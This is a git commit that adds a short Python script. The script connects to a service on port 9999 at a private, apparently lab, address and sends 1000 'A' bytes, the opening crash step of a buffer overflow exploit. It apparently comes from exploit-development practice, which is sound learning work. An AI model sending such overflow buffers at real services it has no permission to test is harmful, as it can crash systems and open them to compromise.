cc6254d33651c09ae9a621c1004333ab9cf86b90
arkadiusz-kotela <arkadiusz.kotela@gmail.com>
2021-08-05 11:53:33 -0400

    01-connection

---
+++ 01_conn.py
@@ -0,0 +1,25 @@
+import socket
+import sys
+from termcolor import colored
+
+HOST = "10.10.225.10"
+PORT = 9999 
+buf = b"A" * 1000
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+    print(colored("[+] Trying to connect ...","yellow"))
+    s.connect((HOST,PORT))
+
+except:
+    print(colored("[!] Connection error to IP:{}, port:{}", "red").format(HOST,PORT))
+    print(colored("[!] Exitting...", "red"))
+    sys.exit(0)
+
+print(colored("[+] Connection successful!","yellow"))
+
+s.recv(1024)
+
+print(colored("[+] Sending buffer...","yellow"))
+s.send(buf)
